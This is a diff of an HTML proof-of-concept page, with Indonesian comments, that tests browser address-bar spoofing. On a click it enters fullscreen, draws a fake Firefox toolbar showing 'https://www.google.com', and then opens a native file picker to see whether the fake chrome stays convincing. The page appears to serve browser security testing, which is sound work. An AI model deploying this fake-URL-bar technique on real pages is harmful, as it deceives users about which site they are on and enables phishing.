@@ -1,19 +1,33 @@
 <!DOCTYPE html>
 <html>
 <body>
+<p>Klik untuk mulai (gesture user)</p>
 <script>
 async function run() {
-  // 1. replaceState agar tampilan URL "bersih"
-  history.replaceState(null, "", "/");
-  // 2. Masuk fullscreen segera setelah gesture
   await document.documentElement.requestFullscreen();
-  // 3. pushState dengan URL lain — beberapa build memperlihatkan
-  //    state lama di URL bar saat navigasi pembatalan (back) cepat
-  history.pushState(null, "", "https://www.google.com/does-not-work-directly");
-  // pushState cross-origin MEMANG diblokir — tes sebenarnya:
-  // buka popup same-origin, dari popup memanipulasi opener.history saat dialog aktif
+  // Gambar chrome Firefox palsu + URL bar google.com
+  const bar = document.createElement("div");
+  bar.style.cssText = "position:fixed;top:0;left:0;right:0;height:70px;background:#f9f9fb;" +
+    "z-index:999999;display:flex;align-items:center;padding:0 8px;gap:8px;border-bottom:1px solid #e0e0e6";
+  bar.innerHTML =
+    "<span>⬅️</span><span>➡️</span><span>⟳</span>" +
+    "<div style='flex:1;background:#fff;border:1px solid #bfbfc9;border-radius:4px;" +
+    "height:34px;display:flex;align-items:center;padding:0 10px;color:#15141a;font-size:13px'>" +
+    "🛡 https://www.google.com</div>" +
+    "<span>☰</span>";
+  document.body.appendChild(bar);
+
+  // Trigger dialog NATIVE Firefox (file picker) yang digambar DI ATAS fullscreen content.
+  // Yang diuji: apakah picker/dialog mengexpose area di luar fullscreen
+  // atau mereset tampilan sehingga chrome palsu tidak sinkron.
+  setTimeout(() => {
+    const i = document.createElement("input");
+    i.type = "file";
+    i.onchange = () => document.exitFullscreen();
+    i.click();
+  }, 1000);
 }
+document.body.onclick = () => run(), {once:true};
 </script>
-<button onclick="run()">Run</button>
 </body>
 </html>
